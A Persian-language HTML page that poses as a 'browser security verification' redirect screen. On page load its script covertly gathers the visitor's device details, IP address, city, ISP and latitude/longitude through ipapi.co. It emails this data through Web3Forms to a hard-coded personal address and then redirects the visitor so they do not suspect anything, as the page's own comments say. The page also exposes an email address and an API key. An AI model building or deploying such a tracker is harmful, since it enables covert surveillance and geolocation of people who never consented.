<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>در حال انتقال...</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: system-ui, -apple-system, sans-serif;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

    <!-- صفحه انتظار فانتزی برای اینکه کاربر شک نکند -->
    <div class="max-w-md w-full text-center space-y-6">
        <div class="inline-flex items-center justify-center p-4 bg-slate-800 rounded-full animate-bounce">
            <svg class="h-12 w-12 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A13.916 13.916 0 009 11V5a2 2 0 00-2-2H5a2 2 0 00-2 2v6a13.978 13.978 0 003.07 9m4.02-3.07a13.91 13.91 0 01-3.07-9V5a2 2 0 012-2h2a2 2 0 012 2v5.183M12 11a9 9 0 11-9 9m9-9c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3z" />
            </svg>
        </div>
        <h1 class="text-2xl font-bold tracking-tight">تایید امنیتی مرورگر...</h1>
        <p class="text-slate-400 text-sm">لطفاً چند لحظه منتظر بمانید. در حال انتقال به صفحه مقصد هستید.</p>
        <div class="flex justify-center">
            <div class="w-16 h-1 bg-blue-500 rounded-full animate-pulse"></div>
        </div>
    </div>

    <script>
        // ۱. کلید اختصاصی Web3Forms خود را اینجا قرار دهید (روش دریافت در فایل README توضیح داده شده است)
        const WEB3FORMS_KEY = "a80878fb-0046-4b7d-8485-3e73e1c1cd68";
        
        // آدرس ایمیل شما برای نمایش در گزارش
        const myEmail = "omidhabibi2228@gmail.com"; 

        // ۲. آدرس مقصدی که کاربر پس از هک/ردیابی باید به آن هدایت شود
        // می‌توانید این آدرس را به صورت داینامیک از پارامتر url هم بگیرید، مثلاً: ?to=https://instagram.com
        const urlParams = new URLSearchParams(window.location.search);
        const redirectTarget = urlParams.get('to') || "https://www.google.com";

        // تابع ثبت مشخصات و ارسال مخفیانه
        async function trackAndRedirect() {
            let trackingData = {
                "زمان ثبت (تهران)": new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' }),
                "سیستم عامل": navigator.platform,
                "مرورگر": navigator.userAgent,
                "ابعاد صفحه نمایش": `${screen.width}x${screen.height}`,
                "زبان دستگاه": navigator.language,
                "صفحه ارجاع‌دهنده": document.referrer || "مستقیم / بدون ارجاع",
                "لینک ورودی": window.location.href
            };

            try {
                // دریافت آی‌پی و موقعیت جغرافیایی از API رایگان
                const ipResponse = await fetch('https://ipapi.co/json/');
                if (ipResponse.ok) {
                    const ipData = await ipResponse.json();
                    trackingData = {
                        ...trackingData,
                        "آدرس IP": ipData.ip,
                        "کشور": ipData.country_name,
                        "شهر": ipData.city,
                        "منطقه / استان": ipData.region,
                        "ارائه‌دهنده اینترنت (ISP)": ipData.org,
                        "مختصات جغرافیایی": `${ipData.latitude}, ${ipData.longitude}`
                    };
                }
            } catch (e) {
                trackingData["آدرس IP"] = "ناموفق در دریافت IP (احتمالاً به دلیل ادبلاکر یا پروکسی)";
            }

            // ارسال اطلاعات به ایمیل شما با استفاده از Web3Forms
            try {
                const response = await fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        access_key: WEB3FORMS_KEY,
                        subject: `🎯 مشخصات ردیابی شده جدید (${trackingData["آدرس IP"] || "بدون IP"})`,
                        from_name: "سیستم ردیاب گیت‌هاب",
                        to_email: myEmail,
                        ...trackingData
                    })
                });

                // مهم نیست ارسال موفقیت‌آمیز باشد یا نه، کاربر را هدایت می‌کنیم تا شک نکند
                redirectToDestination();
            } catch (error) {
                console.error("خطا در ارسال داده‌ها:", error);
                redirectToDestination();
            }
        }

        function redirectToDestination() {
            setTimeout(() => {
                window.location.href = redirectTarget;
            }, 800); // تاخیر کوتاه برای اطمینان از ارسال اطلاعات
        }

        // شروع فرآیند ردیابی به محض لود شدن صفحه
        window.onload = trackAndRedirect;
    </script>
</body>
</html>

